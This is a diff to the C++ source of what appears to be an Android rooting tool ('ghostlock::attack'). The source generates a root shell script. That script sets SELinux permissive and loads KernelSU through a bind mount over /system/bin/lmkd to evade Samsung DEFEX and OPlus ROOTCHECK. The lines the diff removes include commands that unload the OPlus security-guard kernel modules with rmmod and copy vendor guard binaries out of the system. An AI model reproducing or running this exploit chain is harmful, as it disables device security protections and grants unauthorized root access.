@@ -272,12 +272,9 @@ namespace ghostlock::attack {
     }
 
     void write_root_script(void) {
-        /* Measured 2026-11-15: the generated script is 18.2 KiB at HEAD and
-         * 20.2 KiB with the guard probe, against the previous 20 KiB buffer --
-         * 300 bytes of headroom is not a margin. 32 KiB restores it; the
-         * truncation guard below still fails the run rather than writing a
-         * half script. */
-        std::string script(32768, '\0');
+        /* The SELinux enforce-write block adds ~2.5 KiB; 20 KiB keeps the
+         * script well clear of the truncation guard below. */
+        std::string script(20480, '\0');
         support::UniqueFd sfd(
             open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
         if (!sfd.valid()) {
@@ -335,16 +332,6 @@ namespace ghostlock::attack {
             "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
             "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
             "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
-            /* The vendor guard kills a process exec'd from a path ending in
-             * /su (measured 2026-11-15: `adb shell su -c id` -> "Killed", and
-             * opening the manager raises the vendor's block prompt). ksud's
-             * `debug su` grants root through the supercall and then execs `sh`,
-             * so this entry point never touches the su path. Stage a copy where
-             * adb shell can reach it; allow_shell already permits uid 2000. */
-            "if cp \"$KSUD\" /data/local/tmp/ksud 2>/dev/null; then\n"
-            "  chmod 755 /data/local/tmp/ksud 2>/dev/null\n"
-            "  echo 'KSU-ROOT-ENTRY /data/local/tmp/ksud debug su'\n"
-            "fi\n"
             /* W1 leaves SELinux permissive; every post-W1 failure exit restores
              * it, so a run that cannot finish the root phase does not leave the
              * device permissive until reboot. Dumps are written before this
@@ -360,138 +347,6 @@ namespace ghostlock::attack {
              * use. It goes to stdout, which survives the enforcing restore
              * where a $LOG write does not. */
             "  echo \"ENFORCE-RESTORE reason=$e_reason before=${e_before:-unreadable} wrote=$e_wrote readback=${e_after:-unreadable}\"\n"
-            "}\n"
-            /* /proc/modules lists a module as soon as init_module() inserts it,
-             * with state "Loading" (MODULE_STATE_COMING). A name-only grep
-             * therefore reports success while kernelsu_init() is still running.
-             * Read the state field (field 5) instead. */
-            "ksu_state() {\n"
-            "  ksu_line=$(grep '^kernelsu[[:space:]]' /proc/modules 2>/dev/null | head -1 | tr -s ' ' | cut -d' ' -f5)\n"
-            "  echo \"${ksu_line:-absent}\"\n"
-            "}\n"
-            "ksu_live() { [ \"$(ksu_state)\" = Live ]; }\n"
-            /* OPlus/Realme ROOTCHECK (oplus_security_guard / secure_harden)
-             * kills a root execve of an app-owned file under /data:
-             * "execve_block", exit 137, "exited with preempt_count 1". The
-             * direct ksud exec cannot work there, so start with the bind mount.
-             * The detection is by kernel features, not by a device list. */
-            "oem_exec_gate() {\n"
-            "  grep -qE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null && return 0\n"
-            "  grep -q 'oplusboot' /proc/cmdline 2>/dev/null && return 0\n"
-            "  return 1\n"
-            "}\n"
-            /* ksud late-load daemonizes (double fork) and returns to this shell
-             * before the module is loaded. Its grandchild then installs the
-             * userspace half, applies sepolicy rules, runs the stage scripts and
-             * restarts the manager. Wait for both halves, not just the name. */
-            "run_late_load() {\n"
-            "  ll_mode=$1\n"
-            "  if [ \"$ll_mode\" = mount ]; then\n"
-            "    umount -l /system/bin/lmkd 2>/dev/null\n"
-            "    if ! mount --bind \"$KSUD\" /system/bin/lmkd 2>>\"$LOG\"; then\n"
-            "      echo '[!] /system/bin/lmkd bind mount unavailable' >>\"$LOG\"\n"
-            "      return 1\n"
-            "    fi\n"
-            "    echo 'KSU-PHASE late-load-mount'\n"
-            "    /system/bin/lmkd late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-            "    echo \"[*] mounted late-load exit=$?\" >>\"$LOG\"\n"
-            /* Detach immediately: MNT_DETACH keeps the inode alive for the
-             * already-exec'd daemon child, and the OEM re-enforces SELinux
-             * ~20 s later, after which this umount is denied and the mount
-             * would shadow the real lmkd until reboot. */
-            "    umount -l /system/bin/lmkd 2>/dev/null\n"
-            "  else\n"
-            "    echo \"KSU-PHASE late-load-direct kmi=$KMI\"\n"
-            "    chmod 755 \"$KSUD\" 2>/dev/null\n"
-            "    \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
-            "    echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
-            "  fi\n"
-            "  return 0\n"
-            "}\n"
-            /* kernelsu_init ends with setenforce(true), and from that moment this
-             * shell cannot read /proc/modules. Measured 2026-11-15: the module
-             * is visible for ~0.2 s before the flip, which a grep pipeline
-             * cannot reliably sample. The drained kernel log in
-             * /data/local/tmp survives the flip, so readiness is "module seen"
-             * OR "KernelSU printed its banner" OR "ksud installed". */
-            "ksu_booted() { grep -q 'KernelSU: welcome' \"$KMSG_MIRROR\" 2>/dev/null; }\n"
-            "ksu_crown() {\n"
-            "  crown=$(grep -E 'Crowning manager: uid=|manager uid unchanged|Found manager base.apk|Search manager finished' \"$KMSG_MIRROR\" 2>/dev/null | tail -n 3)\n"
-            "  case \"$crown\" in\n"
-            "    *'Crowning manager: uid='*|*'manager uid unchanged'*) KSU_MANAGER=crowned ;;\n"
-            "    *'is_manager: 0'*) KSU_MANAGER=signature-mismatch ;;\n"
-            "    *'Found manager base.apk'*) KSU_MANAGER=found-unverified ;;\n"
-            "    *'Search manager finished'*) KSU_MANAGER=scan-done-no-crown ;;\n"
-            "  esac\n"
-            "}\n"
-            "ksu_ready_now() {\n"
-            "  ksu_booted && return 0\n"
-            "  [ \"$KSU_SEEN\" = Loading ] && return 0\n"
-            "  [ \"$KSU_SEEN\" = Live ] && return 0\n"
-            "  [ -e /data/adb/ksud ] && return 0\n"
-            "  return 1\n"
-            "}\n"
-            "wait_ksu_ready() {\n"
-            "  KSU_INSTALL=0\n"
-            "  for i in $(seq 1 60); do\n"
-            "    ks_s=$(ksu_state)\n"
-            "    [ \"$ks_s\" = Live ] && KSU_SEEN=Live\n"
-            "    [ \"$ks_s\" = Loading ] && [ \"$KSU_SEEN\" = absent ] && KSU_SEEN=Loading\n"
-            "    [ -e /data/adb/ksud ] && KSU_INSTALL=1\n"
-            "    if ksu_ready_now; then break; fi\n"
-            "    sleep 0.1\n"
-            "  done\n"
-            "  KSU_BOOT=0\n"
-            "  ksu_booted && KSU_BOOT=1\n"
-            "  KSU_SU_PRESENT=absent\n"
-            "  [ -e /data/adb/ksu/bin/su ] && KSU_SU_PRESENT=present\n"
-            /* Unredirected: the app's data dir stops being writable as soon as
-             * SELinux is enforcing, and stdout still reaches the run log. */
-            "  echo \"KSU-READY seen=$KSU_SEEN boot=$KSU_BOOT install=$KSU_INSTALL attempts=$i su=$KSU_SU_PRESENT\"\n"
-            "  echo \"[*] ksu readiness seen=$KSU_SEEN boot=$KSU_BOOT install=$KSU_INSTALL attempts=$i su=$KSU_SU_PRESENT\" >>\"$LOG\"\n"
-            "}\n"
-            /* The init window is ~0.3 s and the enforcing flip closes dmesg for
-             * good. Sample tightly right after the exec: the throne tracker runs
-             * before setenforce(true), so the last successful sample carries the
-             * crown lines. */
-            "ksu_capture() {\n"
-            "  n=0; miss=0\n"
-            "  while [ \"$n\" -lt 12 ]; do\n"
-            "    n=$((n + 1))\n"
-            "    if timeout 1 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
-            "      mv \"$KMSG_MIRROR.new\" \"$KMSG_MIRROR\" 2>/dev/null\n"
-            "      if [ \"$KMSG_LOG\" != \"$KMSG_MIRROR\" ]; then cp \"$KMSG_MIRROR\" \"$KMSG_LOG\" 2>/dev/null; fi\n"
-            "      miss=0\n"
-            "    else\n"
-            "      miss=$((miss + 1))\n"
-            "      [ \"$miss\" -ge 3 ] && break\n"
-            "    fi\n"
-            "    sleep 0.1\n"
-            "  done\n"
-            "  KSU_BOOT=0; ksu_booted && KSU_BOOT=1\n"
-            "  echo \"KSU-CAPTURE samples=$n miss=$miss boot=$KSU_BOOT\"\n"
-            "}\n"
-            /* The crown compares the manager APK's signing certificate against a
-             * hash compiled into the module. `ksud debug get-sign` is pure
-             * userspace, so this answers "will the crown fail?" without the
-             * kernel log. Run it before the late-load, while the shell can still
-             * exec a copy in /data/local/tmp. */
-            "ksu_mgr_sign() {\n"
-            "  mgr_apk=\"\"\n"
-            "  for p in me.weishu.kernelsu.pr me.weishu.kernelsu com.rifsxd.ksunext com.resukisu.resukisu org.bakasu.bakasu com.kowx712.supermanager; do\n"
-            "    mgr_apk=$(find /data/app -path \"*/$p-*/base.apk\" 2>/dev/null | head -1)\n"
-            "    [ -n \"$mgr_apk\" ] && break\n"
-            "  done\n"
-            "  if [ -z \"$mgr_apk\" ]; then echo 'KSU-MGRSIGN apk=none'; return 0; fi\n"
-            "  tmp=/data/local/tmp/ghostlock-ksud-$$\n"
-            "  if cp /data/adb/ksud \"$tmp\" 2>/dev/null || cp \"$KSUD\" \"$tmp\" 2>/dev/null; then\n"
-            "    chmod 755 \"$tmp\" 2>/dev/null\n"
-            "    sig=$(\"$tmp\" debug get-sign \"$mgr_apk\" 2>&1 | tail -n 1)\n"
-            "    rm -f \"$tmp\" 2>/dev/null\n"
-            "    echo \"KSU-MGRSIGN apk=$mgr_apk $sig\"\n"
-            "  else\n"
-            "    echo 'KSU-MGRSIGN copy-failed'\n"
-            "  fi\n"
             "}\n"
             "if [ \"$(id -u)\" -ne 0 ]; then\n"
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
@@ -574,60 +429,6 @@ namespace ghostlock::attack {
             "  echo \"[*] vr.ko selinux block: post node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) vrp=${post:-none}\" >>\"$LOG\"\n"
             "  return 0\n"
             "}\n"
-            /* OPlus guard probe (2026-11-15). The gate doc records the kill but
-             * not the actor. qsguard (/system_ext/bin/qsguard, uid 1000) runs
-             * with capabilities KILL and group readproc, burns no CPU and is
-             * event-driven -- the prime suspect for the process-level kill. Its
-             * binary, its fds and its inputs are root-only, so this stage copies
-             * them out while the shell still has uid 0 and SELinux is
-             * permissive. Read-only: it starts nothing, signals nothing and
-             * changes no state. */
-            "guard_probe() {\n"
-            "  gp_t0=$(date +%%s)\n"
-            "  gp_dir=/data/local/tmp/ghostlock-guard-$$\n"
-            "  mkdir -p \"$gp_dir\" 2>/dev/null\n"
-            "  echo 'GUARD-PROBE-BEGIN'\n"
-            "  echo \"[*] guard probe: dir=$gp_dir ctx=$(cat /proc/self/attr/current 2>/dev/null)\" >>\"$LOG\"\n"
-            "  { echo \"kernel=$(uname -r) uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\";\n"
-            "    echo '--- modules ---';\n"
-            "    grep -E '^oplus_(security_guard|secure_harden|security_keventupload)[[:space:]]' /proc/modules 2>/dev/null;\n"
-            "    echo '--- kallsyms guard symbols ---';\n"
-            "    grep -cE '\\[oplus_(security_guard|secure_harden)\\]' /proc/kallsyms 2>/dev/null;\n"
-            "    grep -E '\\[oplus_(security_guard|secure_harden)\\]$' /proc/kallsyms 2>/dev/null | head -n 40;\n"
-            "    echo '--- kallsyms rootcheck ---';\n"
-            "    grep -iE 'rootcheck|oem_exec_gate' /proc/kallsyms 2>/dev/null | head -n 20;\n"
-            "  } >\"$gp_dir/kallsyms.txt\" 2>&1\n"
-            /* One ps, then only the handful of matching pids. Walking all of
-             * /proc with a subshell per entry costs seconds on a loaded phone,
-             * and this stage runs before the policy fixup, so it must stay
-             * cheap: the chain's own script timeout is what pays for it. */
-            "  gp_pids=$(ps -A -o PID,NAME 2>/dev/null | grep -E 'qsguard|securityguard|phonemanager' | awk '{print $1}')\n"
-            "  for gp_pid in $gp_pids; do\n"
-            "    gp_p=/proc/$gp_pid\n"
-            "    { echo \"pid=$gp_pid comm=$(cat $gp_p/comm 2>/dev/null) owner=$(stat -c %%u $gp_p 2>/dev/null) ctx=$(cat $gp_p/attr/current 2>/dev/null)\";\n"
-            "      echo \"  cmd=$(tr '\\0' ' ' < $gp_p/cmdline 2>/dev/null | cut -c1-160)\";\n"
-            "      grep -E '^(CapEff|CapPrm|Threads|SigCgt)' $gp_p/status 2>/dev/null;\n"
-            "      echo '  fds:';\n"
-            "      ls -l $gp_p/fd 2>/dev/null | tail -n +2 | head -n 25;\n"
-            "    } >>\"$gp_dir/procs.txt\" 2>&1\n"
-            "  done\n"
-            "  cp /system_ext/bin/qsguard \"$gp_dir/qsguard.bin\" 2>/dev/null\n"
-            "  cp /system_ext/etc/init/qsguard.rc \"$gp_dir/qsguard.rc\" 2>/dev/null\n"
-            "  cp /vendor/lib/modules/oplus_security_guard.ko \"$gp_dir/\" 2>/dev/null\n"
-            "  cp /vendor/lib/modules/oplus_secure_harden.ko \"$gp_dir/\" 2>/dev/null\n"
-            "  cp /vendor/lib/modules/oplus_security_keventupload.ko \"$gp_dir/\" 2>/dev/null\n"
-            /* pm talks to the package service and can stall; bound it so a slow
-             * system_server cannot hold the chain. */
-            "  timeout 4 pm path com.coloros.securityguard >\"$gp_dir/pkg.txt\" 2>&1\n"
-            "  timeout 4 pm path com.coloros.phonemanager >>\"$gp_dir/pkg.txt\" 2>&1\n"
-            "  chmod 755 \"$gp_dir\" 2>/dev/null\n"
-            "  chmod 644 \"$gp_dir\"/* 2>/dev/null\n"
-            "  echo \"[*] guard probe: elapsed=$(( $(date +%%s) - gp_t0 ))s artifacts=$(ls \"$gp_dir\" 2>/dev/null | tr '\\n' ' ') qsguard=$( [ -f \"$gp_dir/qsguard.bin\" ] && wc -c <\"$gp_dir/qsguard.bin\" 2>/dev/null || echo 0 ) bytes\" >>\"$LOG\"\n"
-            "  echo \"GUARD-PROBE-DIR $gp_dir\"\n"
-            "  echo 'GUARD-PROBE-END'\n"
-            "  return 0\n"
-            "}\n"
-            "guard_probe\n"
             "vrko_selinux_block\n"
             /* the rename is atomic, so a failed read leaves the old dump in place */
             "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
@@ -662,48 +463,19 @@ namespace ghostlock::attack {
              * debug dir (or the app's home dir). The loop also exits when the
              * parent shell is gone; the EXIT trap kills it normally. */
             "KMSG_LOG=\"\"\n"
-            "KMSG_MIRROR=\"/data/local/tmp/ghostlock-kmsg-$$.txt\"\n"
             "KMSG_DRAIN_PID=\"\"\n"
             "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
             "  if [ -n \"$DEBUG_DIR\" ]; then KMSG_LOG=\"$DEBUG_DIR/kmsg-live.txt\"; fi\n"
             "  if [ -z \"$KMSG_LOG\" ]; then KMSG_LOG=\"$HOME_DIR/kmsg-live.txt\"; fi\n"
-            /* kernelsu_init ends with setenforce(true). From that moment this
-             * shell cannot read /proc/modules or dmesg, and the app's data dir
-             * stops taking writes -- measured 2026-11-15: the enforcing flip
-             * lands ~0.2 s after the module appears. /data/local/tmp stays
-             * writable, so the drain always writes the mirror there and copies
-             * into the run folder only while that still succeeds. */
-            "  ( while kill -0 $$ 2>/dev/null; do\n"
-            /* 1200 lines: the OPlus kernel logs bursts of madvise/CHP noise, and
-             * the KernelSU banner must still be inside the window. The -s test
-             * is load-bearing: once enforcing, dmesg fails but the pipeline
-             * still exits 0 through tail, and an empty file would clobber the
-             * last good snapshot (measured 2026-11-15). */
-            "      if timeout 2 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
-            "        mv \"$KMSG_MIRROR.new\" \"$KMSG_MIRROR\" 2>/dev/null\n"
-            "        if [ \"$KMSG_LOG\" != \"$KMSG_MIRROR\" ]; then cp \"$KMSG_MIRROR\" \"$KMSG_LOG\" 2>/dev/null; fi\n"
-            "      fi\n"
-            "      sync\n"
-            "      sleep 0.5\n"
-            "    done ) &\n"
+            "  if ! ( : >\"$KMSG_LOG\" ) 2>/dev/null; then KMSG_LOG=\"/data/local/tmp/kmsg-live-$$.txt\"; fi\n"
+            "  ( while kill -0 $$ 2>/dev/null; do timeout 2 dmesg 2>/dev/null | tail -n 300 >\"$KMSG_LOG.new\"; mv \"$KMSG_LOG.new\" \"$KMSG_LOG\" 2>/dev/null; sync; sleep 0.5; done ) &\n"
             "  KMSG_DRAIN_PID=$!\n"
             "  echo \"KMSG-DRAIN=$KMSG_LOG\"\n"
-            "  echo \"KMSG-MIRROR=$KMSG_MIRROR\"\n"
             "fi\n"
             "dump_debug() {\n"
+            "  [ -n \"$DEBUG_DIR\" ] || return 0\n"
             "  [ \"$NO_INSTR\" -eq 0 ] || return 0\n"
-            "  dump_dir=\"$DEBUG_DIR\"\n"
-            /* Once SELinux is enforcing the app's data dir rejects writes, which
-             * is why the post-load dump used to vanish. Fall back rather than
-             * skipping the dump: /data/local/tmp stays writable. */
-            "  if [ -z \"$dump_dir\" ] || ! mkdir -p \"$dump_dir/pstore\" 2>/dev/null; then\n"
-            "    dump_dir=\"/data/local/tmp/ghostlock-$$\"\n"
-            "    if ! mkdir -p \"$dump_dir/pstore\" 2>/dev/null; then\n"
-            "      echo '[!] debug dump: no writable directory' >>\"$LOG\"\n"
-            "      return 0\n"
-            "    fi\n"
-            "    echo \"DUMP-FALLBACK=$dump_dir\"\n"
-            "  fi\n"
+            "  mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null || { echo \"[!] debug dump: cannot write $DEBUG_DIR\" >>\"$LOG\"; return 0; }\n"
             "  {\n"
             "    echo '== uname -a =='\n"
             "    uname -a\n"
@@ -712,35 +484,34 @@ namespace ghostlock::attack {
             "    echo '== /proc/cmdline =='\n"
             "    cat /proc/cmdline\n"
             "    echo '== /proc/modules =='\n"
-            "    cat /proc/modules 2>&1\n"
+            "    cat /proc/modules\n"
             "    echo '== selinux =='\n"
             "    getenforce 2>/dev/null\n"
-            "  } >\"$dump_dir/kernel-info.txt\" 2>&1\n"
-            "  if ! timeout 2 dmesg >\"$dump_dir/kernel-dmesg.log\" 2>&1; then\n"
-            "    echo '[!] dmesg unavailable' >>\"$dump_dir/kernel-dmesg.log\"\n"
+            "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
+            "  if ! timeout 2 dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
+            "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
             "  fi\n"
             "  for f in /sys/fs/pstore/*; do\n"
             "    [ -f \"$f\" ] || continue\n"
-            "    cp \"$f\" \"$dump_dir/pstore/\" 2>/dev/null\n"
+            "    cp \"$f\" \"$DEBUG_DIR/pstore/\" 2>/dev/null\n"
             /* The app's export zips top-level files only; keep the
              * subdirectory for a human, and put a flattened copy where the
              * zip will actually carry it. pstore is read on the next run's
              * shell (the app has no root at boot), so the previous boot's
              * crash lands in this run's folder. */
-            "    cp \"$f\" \"$dump_dir/pstore-${f##*/}\" 2>/dev/null\n"
+            "    cp \"$f\" \"$DEBUG_DIR/pstore-${f##*/}\" 2>/dev/null\n"
             "  done\n"
-            "  cp /proc/iomem \"$dump_dir/iomem.txt\" 2>/dev/null\n"
-            "  cp \"$LOG\" \"$dump_dir/ksu.log\" 2>/dev/null\n"
-            "  cp \"$KMSG_MIRROR\" \"$dump_dir/kmsg-live.txt\" 2>/dev/null\n"
+            "  cp /proc/iomem \"$DEBUG_DIR/iomem.txt\" 2>/dev/null\n"
+            "  cp \"$LOG\" \"$DEBUG_DIR/ksu.log\" 2>/dev/null\n"
             /* The app has to read these back to put them in the exported zip,
              * and this shell writes them root-only (umask 022, but dmesg and
              * /proc/iomem land 600/400). The dump directory is the app's own,
              * so hand the files to it by mode rather than by owner. */
-            "  chmod 644 \"$dump_dir\"/*.txt \"$dump_dir\"/*.log 2>/dev/null\n"
-            "  chmod 755 \"$dump_dir\"/pstore 2>/dev/null\n"
-            "  chmod 644 \"$dump_dir\"/pstore/* 2>/dev/null\n"
-            "  chmod 644 \"$dump_dir\"/pstore-* 2>/dev/null\n"
-            "  echo \"[*] debug dump written to $dump_dir\" >>\"$LOG\"\n"
+            "  chmod 644 \"$DEBUG_DIR\"/*.txt \"$DEBUG_DIR\"/*.log 2>/dev/null\n"
+            "  chmod 755 \"$DEBUG_DIR\"/pstore 2>/dev/null\n"
+            "  chmod 644 \"$DEBUG_DIR\"/pstore/* 2>/dev/null\n"
+            "  chmod 644 \"$DEBUG_DIR\"/pstore-* 2>/dev/null\n"
+            "  echo \"[*] debug dump written to $DEBUG_DIR\" >>\"$LOG\"\n"
             "}\n"
             "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
             "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
@@ -750,33 +521,6 @@ namespace ghostlock::attack {
             "fi\n"
             "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
             "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
-            "fi\n"
-            /* Measured 2026-11-15 on this device: kernelsu is Live and the
-             * manager is crowned, yet nothing that calls setuid survives,
-             * because oplus_security_guard runs the escalation check from a
-             * sys_exit tracepoint. That module is a loadable .ko whose refcount
-             * is 0 (`oplus_secure_harden` is held only by it), so the check may
-             * not need a write primitive at all: delete_module unregisters the
-             * tracepoint outright. rmmod needs CAP_SYS_MODULE, which init_cred
-             * already carries, and W1 left SELinux permissive. Run it before
-             * the KernelSU work so that, if it succeeds, the rest of this same
-             * run -- including the su probe at the end -- runs guard-free.
-             * Instrumentation-gated: the product path is unchanged. */
-            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
-            "  gu_cap=$(grep CapEff /proc/self/status 2>/dev/null | cut -f2)\n"
-            "  gu_md=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)\n"
-            "  gu_before=$(grep -cE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null)\n"
-            "  gu_exe=$(command -v rmmod 2>/dev/null)\n"
-            "  [ -n \"$gu_exe\" ] || gu_exe=/system/bin/rmmod\n"
-            "  echo \"GUARD-BEFORE count=$gu_before cap=$gu_cap modules_disabled=${gu_md:-unreadable} rmmod=$gu_exe\"\n"
-            "  echo \"[*] guard before count=$gu_before cap=$gu_cap md=${gu_md:-unreadable} rmmod=$gu_exe\" >>\"$LOG\"\n"
-            /* security_guard first: secure_harden's refcount of 1 is held by it,
-             * so the reverse order would just fail with EBUSY. */
-            "  \"$gu_exe\" oplus_security_guard 2>>\"$LOG\"; gu_rc1=$?\n"
-            "  \"$gu_exe\" oplus_secure_harden 2>>\"$LOG\"; gu_rc2=$?\n"
-            "  gu_after=$(grep -cE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null)\n"
-            "  echo \"GUARD-UNLOAD rc1=$gu_rc1 rc2=$gu_rc2 before=$gu_before after=$gu_after\"\n"
-            "  echo \"[*] guard unload rc1=$gu_rc1 rc2=$gu_rc2 after=$gu_after\" >>\"$LOG\"\n"
             "fi\n"
             "# step 1: restore policy\n"
             /* The dump is a *working copy* -- patched in place, then handed to
@@ -872,9 +616,9 @@ namespace ghostlock::attack {
 
             "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
             "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
-            "if ksu_live; then\n"
+            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
             "  KSU_ALREADY=1\n"
-            "  echo \"[*] kernelsu already live; skipping late-load\" >>\"$LOG\"\n"
+            "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
             "else\n"
             "  KSU_ALREADY=0\n"
             "  if [ ! -x \"$KSUD\" ]; then\n"
@@ -886,113 +630,51 @@ namespace ghostlock::attack {
             "  fi\n"
             "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
             "  dump_debug\n"
-            /* Runs while SELinux is still permissive and needs no kernel log. */
-            "  ksu_mgr_sign\n"
-            /* Samsung DEFEX safeplace and OPlus ROOTCHECK both kill a root exec
-             * of a /data binary. Use the lmkd bind-mount path first when the
-             * vendor gate is visible; otherwise try the direct exec and fall
-             * back to the mount. ksud daemonizes, so its exit status says
-             * nothing about whether the module was loaded. */
-            "  OEM_GATE=0\n"
-            "  oem_exec_gate && OEM_GATE=1\n"
-            "  if [ \"$OEM_GATE\" -eq 1 ]; then\n"
-            "    LATE_LOAD_MODE=mount\n"
-            "    echo 'KSU-GATE vendor-exec-block mount-first'\n"
-            "  else\n"
-            "    LATE_LOAD_MODE=direct\n"
-            "  fi\n"
-            /* Measured 2026-11-15: OPlus ROOTCHECK flags the sepolicy reload and
-             * kills root execs for a short window after it. The 09:57 run
-             * loaded the module 2.8 s after the fixup; the 12:02 run exec'd at
-             * 0.4 s and its daemonized ksud died before init_module, leaving
-             * /proc/modules empty for the whole wait. Settle first, then retry
-             * while the module stays absent. */
-            "  LATE_LOAD_SETTLE=4\n"
-            "  echo \"[*] post-fixup settle ${LATE_LOAD_SETTLE}s; mode=$LATE_LOAD_MODE gate=$OEM_GATE\" >>\"$LOG\"\n"
-            "  sleep \"$LATE_LOAD_SETTLE\"\n"
-            "  KSU_ATTEMPT=0\n"
-            "  KSU_SEEN=absent\n"
-            /* Measured 2026-11-15: the same 4 s settle loaded the module at
-             * 13:10 and missed it at 13:34, so the vendor's kill window is not
-             * fixed. Three attempts, spaced wider each time. */
-            "  while [ \"$KSU_ATTEMPT\" -lt 3 ]; do\n"
-            "    KSU_ATTEMPT=$((KSU_ATTEMPT + 1))\n"
-            "    run_late_load \"$LATE_LOAD_MODE\"\n"
-            "    ksu_capture\n"
-            "    for i in $(seq 1 40); do\n"
-            "      ks_s=$(ksu_state)\n"
-            "      [ \"$ks_s\" = Live ] && KSU_SEEN=Live\n"
-            "      [ \"$ks_s\" = Loading ] && [ \"$KSU_SEEN\" = absent ] && KSU_SEEN=Loading\n"
-            "      if ksu_ready_now; then break; fi\n"
-            "      sleep 0.1\n"
-            "    done\n"
-            "    KSU_BOOT=0\n"
-            "    ksu_booted && KSU_BOOT=1\n"
-            "    echo \"KSU-ATTEMPT n=$KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT\"\n"
-            "    echo \"[*] attempt $KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT\" >>\"$LOG\"\n"
-            "    ksu_ready_now && break\n"
-            /* A gated device keeps the mount path: the direct exec is the one
-             * the vendor kills. Elsewhere alternate to cover both carriers. */
-            "    if [ \"$OEM_GATE\" -eq 0 ]; then\n"
-            "      if [ \"$LATE_LOAD_MODE\" = direct ]; then LATE_LOAD_MODE=mount; else LATE_LOAD_MODE=direct; fi\n"
-            "    fi\n"
-            "    sleep 4\n"
+            "  echo \"KSU-PHASE late-load-direct kmi=$KMI\"\n"
+            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
+            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+            "  KSU_LOAD_RC=$?\n"
+            "  echo \"[*] late-load exit=$KSU_LOAD_RC\" >>\"$LOG\"\n"
+            /* Samsung DEFEX safeplace kills a root exec of a /data binary
+             * (ksud) before it can load the module. Retry the same exec with
+             * the binary bind-mounted over a whitelisted system path: DEFEX
+             * sees /system/bin/lmkd, ksud runs, and the module is loaded from
+             * ksud's embedded asset. The mount is detached immediately after
+             * the call; lmkd never re-execs, so the window is inert. */
+            "  KSU_NOW=0\n"
+            "  for i in $(seq 1 20); do\n"
+            "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_NOW=1; break; fi\n"
+            "    sleep 0.1\n"
             "  done\n"
-            "fi\n"
-            "if [ \"$KSU_ALREADY\" -eq 0 ]; then\n"
-            "  wait_ksu_ready\n"
-            "else\n"
-            "  KSU_SEEN=Live\n"
-            "  KSU_BOOT=1\n"
-            "  KSU_INSTALL=1\n"
+            "  if [ \"$KSU_NOW\" -ne 1 ]; then\n"
+            "    echo '[*] late-load did not load; retrying via the /system/bin/lmkd bind mount' >>\"$LOG\"\n"
+            "    echo 'KSU-PHASE late-load-mount'\n"
+            "    umount -l /system/bin/lmkd 2>/dev/null\n"
+            "    if [ -e /system/bin/lmkd ] && mount --bind \"$KSUD\" /system/bin/lmkd 2>>\"$LOG\"; then\n"
+            "      /system/bin/lmkd late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+            "      echo \"[*] mounted late-load exit=$?\" >>\"$LOG\"\n"
+            "      umount -l /system/bin/lmkd 2>/dev/null\n"
+            "    else\n"
+            "      echo '[!] /system/bin/lmkd bind mount unavailable' >>\"$LOG\"\n"
+            "    fi\n"
+            "  fi\n"
             "fi\n"
             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
             "KSU_READY=0\n"
-            /* "Loading" only proves insertion; the banner and the installed
-             * daemon also prove kernelsu_init() ran. Prefer the stronger two. */
-            "if [ \"$KSU_SEEN\" = Live ] || [ \"$KSU_BOOT\" = 1 ] || [ \"$KSU_INSTALL\" -eq 1 ]; then KSU_READY=1; fi\n"
+            "for i in $(seq 1 50); do\n"
+            "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
+            "  sleep 0.1\n"
+            "done\n"
             "if [ \"$KSU_READY\" -eq 1 ]; then\n"
             "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
-            /* ksud's userspace half (stage scripts, sepolicy rules and the
-             * manager restart) keeps running after init_module returns. Hold
-             * the root shell for a short settle instead of cutting it off. */
